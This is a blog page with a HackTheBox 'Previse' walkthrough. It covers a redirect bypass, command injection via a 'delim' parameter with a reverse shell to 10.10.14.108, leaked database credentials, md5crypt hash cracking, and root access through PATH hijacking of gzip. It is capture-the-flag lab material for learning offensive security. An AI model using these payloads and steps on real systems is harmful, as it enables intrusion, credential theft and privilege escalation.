<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="nair0lf32 ">
<meta name="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U&#43;bBa/UyMNxMjkPO&#43;rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB&#43;KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q&#43;i&#43;gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI&#43;k9kT2gYslacuTwQhacntIh2XFo0YtfY&#43;dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd| 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF&#43;aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=| 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv&#43;Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-title: Previse Login|_Requested resource was login.php| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2." />
<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/previse/previse/" />


    <title>
        
            Previse :: Zer0ne blog 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Previse">
<meta itemprop="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U&#43;bBa/UyMNxMjkPO&#43;rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB&#43;KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q&#43;i&#43;gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI&#43;k9kT2gYslacuTwQhacntIh2XFo0YtfY&#43;dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd| 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF&#43;aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=| 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv&#43;Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-title: Previse Login|_Requested resource was login.php| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2."><meta itemprop="datePublished" content="2022-09-20T15:03:31+01:00" />
<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
<meta itemprop="wordCount" content="995"><meta itemprop="image" content="http://localhost:1313/" />
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="Previse"/>
<meta name="twitter:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U&#43;bBa/UyMNxMjkPO&#43;rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB&#43;KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q&#43;i&#43;gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI&#43;k9kT2gYslacuTwQhacntIh2XFo0YtfY&#43;dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd| 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF&#43;aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=| 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv&#43;Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-title: Previse Login|_Requested resource was login.php| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2."/>



    <meta property="og:title" content="Previse" />
<meta property="og:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U&#43;bBa/UyMNxMjkPO&#43;rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB&#43;KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q&#43;i&#43;gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI&#43;k9kT2gYslacuTwQhacntIh2XFo0YtfY&#43;dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd| 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF&#43;aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=| 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv&#43;Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-title: Previse Login|_Requested resource was login.php| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/hackthebox/previse/previse/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2022-09-20T15:03:31+01:00" />
<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />





    <meta property="article:section" content="HackTheBox" />



    <meta property="article:published_time" content="2022-09-20 15:03:31 &#43;0100 WAT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="http://localhost:1313/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">#&gt;</span>
            <span class="logo__text">0/1</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#0FF00D;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/writeups/hackthebox/previse/previse/">Previse</a></h2>

            
            
            

            <div class="post-content">
                <h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">nmap</h3>
<pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U+bBa/UyMNxMjkPO+rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB+KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q+i+gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI+k9kT2gYslacuTwQhacntIh2XFo0YtfY+dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF+aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=
|   256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv+Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><h3 id="ffuf">ffuf</h3>
<pre tabindex="0"><code>login                   [Status: 200, Size: 2224, Words: 486, Lines: 54]
files                   [Status: 302, Size: 4914, Words: 1531, Lines: 113]
header                  [Status: 200, Size: 980, Words: 183, Lines: 21]
nav                     [Status: 200, Size: 1248, Words: 462, Lines: 32]
download                [Status: 302, Size: 0, Words: 1, Lines: 1]
footer                  [Status: 200, Size: 217, Words: 10, Lines: 6]
index                   [Status: 302, Size: 2801, Words: 737, Lines: 72]
status                  [Status: 302, Size: 2968, Words: 749, Lines: 75]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
config                  [Status: 200, Size: 0, Words: 1, Lines: 1]
logs                    [Status: 302, Size: 0, Words: 1, Lines: 1]
</code></pre><p>Good enumeration was key here&hellip;first didnt find any useful directory
Then I started fuzzing with ffuf to find more pages</p>
<p><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.11.104/FUZZ.php</code></p>
<p><code>nav.php</code> is the most useful and shows more pages
But all require authentification :(</p>
<p>but we can bypass that with burpsuite</p>
<p>we can see the pages&hellip;we request <code>accounts.php</code> and change do capture response</p>
<p>change response code from <code>301 found</code> (redirect) to <code>200 Ok</code> and forward allows us to bypass redirect</p>
<p>Now we create an account to have access</p>
<pre tabindex="0"><code>POST /accounts.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,_/_;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://10.10.11.104
DNT: 1
Connection: close
Referer: http://10.10.11.104/login.php
Cookie: PHPSESSID=grjd8tcm0bkoeoqbetojkms7eo
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=nairolf&amp;password=nairolf&amp;confirm=nairolf&amp;submit=
</code></pre><p>Forward and now we can login as &rsquo;nairolf&rsquo; and start looking around pages</p>
<p><code>status.php</code></p>
<pre tabindex="0"><code>Check website status:

MySQL server is online and connected!

There are 5 registered admins

There is 1 uploaded file
</code></pre><p><code>file_logs.php</code>
here we can download log file as <code>out.log</code></p>
<p><code>files.php</code></p>
<p>we can see newguy uploaded a file <code>sitebackup.zip</code> we get that</p>
<p>From the sitebackup.zip we get all php files and from <code>config.php</code> we get this</p>
<pre tabindex="0"><code>&lt;?php

function connectDB(){
	$host = &#39;localhost&#39;;
	$user = &#39;root&#39;;
	$passwd = &#39;mySQL_p@ssw0rd!:)&#39;;
	$db = &#39;previse&#39;;
	$mycon = new mysqli($host, $user, $passwd, $db);
	return $mycon;
}

?&gt;
</code></pre><p>we get database credentials</p>
<p>In the code of <code>logs.php</code> the <code>exec()</code> function can give us code execution with <code>delim</code> parameter</p>
<p>Capture a log download request in burpsuite</p>
<p>To <code>delim=comma</code> we add our shell code wich give us<br>
<code>delim=comma&amp;bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.10.14.108/2311 &lt;&amp;1'</code></p>
<p>we get a shell on netcat</p>
<p>inside as www-data our actions are limited&hellip;we can use credentials from config.php</p>
<p><code>mysql --host=localhost --user=root --password=mySQL_p@ssw0rd\!:\) previse</code></p>
<p>Added an escape <code>\</code> to password characters</p>
<pre tabindex="0"><code>mysql&gt; show tables;
show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts |
| files |
+-------------------+
2 rows in set (0.00 sec)
</code></pre><pre tabindex="0"><code>mysql&gt; select _ from accounts;
select _ from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password | created_at |
+----+----------+------------------------------------+---------------------+
| 1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | test123  | $1$🧂llol$sP8qi2I.K6urjPuzdGizl1 | 2021-10-31 20:21:38 |
|  3 | adminx   | $1$🧂llol$5tZsYwBL.ah/7MifOnD8y1 | 2021-10-31 20:45:45 |
|  4 | nairolf  | $1$🧂llol$dtYsbcUDR1v/zUTtHfZzD1 | 2021-10-31 21:05:14 |
+----+----------+------------------------------------+---------------------+
4 rows in set (0.00 sec)
</code></pre><p>At this point we got users and their passwords but they are hashed
Time to decrypt them with hashcat and rockyou (its always rockyou XD)
Took me alot of time to identify the hash type (google please)&hellip;seems like its md5 so the correct command is</p>
<p><code>hashcat '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.' /usr/share/wordlists/rockyou.txt -m 500</code></p>
<p>wich gives us (after some time)</p>
<pre tabindex="0"><code>$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
Time.Started.....: Mon Nov 1 00:05:11 2021 (30 mins, 29 secs)
Time.Estimated...: Mon Nov 1 00:35:40 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 4084 H/s (6.64ms) @ Accel:16 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 7413280/14344385 (51.68%)
Rejected.........: 0/7413280 (0.00%)
Restore.Point....: 7413248/14344385 (51.68%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidates.#1....: ilovecody98 -&gt; ilovecodee

Started: Mon Nov 1 00:03:43 2021
Stopped: Mon Nov 1 00:35:42 2021
</code></pre><p>So the credentials are:
<code>m4lwhere:ilovecody112235!</code></p>
<p>Lateral movement</p>
<pre tabindex="0"><code>su m4lwhere
Password: ilovecody112235!

m4lwhere@previse:~$
</code></pre><p>USER FLAG IS OURS<br>
<code>cat user.txt</code></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<pre tabindex="0"><code>sudo -l
[sudo] password for m4lwhere: ilovecody112235!

User m4lwhere may run the following commands on previse:
(root) /opt/scripts/access_backup.sh
</code></pre><p>uhm&hellip;yeah ok a custom script</p>
<p><code>cat /opt/scripts/access_backup.sh</code></p>
<pre tabindex="0"><code>#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account

# This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time

gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&#34;yesterday&#34; +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&#34;yesterday&#34; +%Y%b%d)\_file_access.gz
</code></pre><p>path injecton is possible with gzip execution</p>
<p>FFirst we create a fake gzip binary with SUID and make it executable</p>
<pre tabindex="0"><code>m4lwhere@previse:/tmp$ echo &#34;chmod +s /bin/bash&#34; &gt; gzip
m4lwhere@previse:/tmp$ chmod +x gzip
</code></pre><p>Export path as we are in tmp folder<br>
<code>m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH</code></p>
<p>we execute the vulnerable script with sudo wich execute our gzip over true one (PATH priority is from left to right)</p>
<pre tabindex="0"><code>m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh
[sudo] password for m4lwhere:
</code></pre><p>Then we set suid to original /bin/bash wich runs as root now</p>
<pre tabindex="0"><code>m4lwhere@previse:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Jun 6 2019 /bin/bash
m4lwhere@previse:/tmp$ bash -p
bash-4.4#
</code></pre><p>the last part was tricky so note that I googled before doing it</p>
<pre tabindex="0"><code>-p Turned on whenever the real and effective user ids do not match.
Disables processing of the $ENV file and importing of shell
functions. Turning this option off causes the effective uid and
gid to be set to the real uid and gid.
</code></pre><p>Now we are root</p>
<pre tabindex="0"><code>bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
</code></pre><p>And its Done!</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/categories/hackthebox/">HackTheBox</a></span>
        
    </p>

			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="http://localhost:1313/">nair0lf32</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>



    </body>
</html>
